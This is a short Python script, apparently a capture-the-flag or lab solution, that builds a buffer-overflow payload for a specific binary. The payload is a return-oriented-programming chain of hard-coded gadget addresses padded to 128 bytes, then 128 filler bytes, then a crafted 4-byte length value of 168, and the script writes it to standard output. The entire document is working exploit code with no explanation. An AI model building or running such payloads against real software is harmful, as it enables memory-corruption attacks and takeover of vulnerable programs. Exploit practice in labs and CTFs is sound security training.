import sys
def pack(value):
    return value.to_bytes(8, "little")
rop = (
    pack(0x4018a4)
    + pack(0x4018a3)
    + pack(4)
    + pack(0x401677)
)
expression = rop.ljust(128, b"A")
log_message = b"B" * 128
length = (168).to_bytes(4, "little")
payload = expression + log_message + length + b"\n"
sys.stdout.buffer.write(payload)
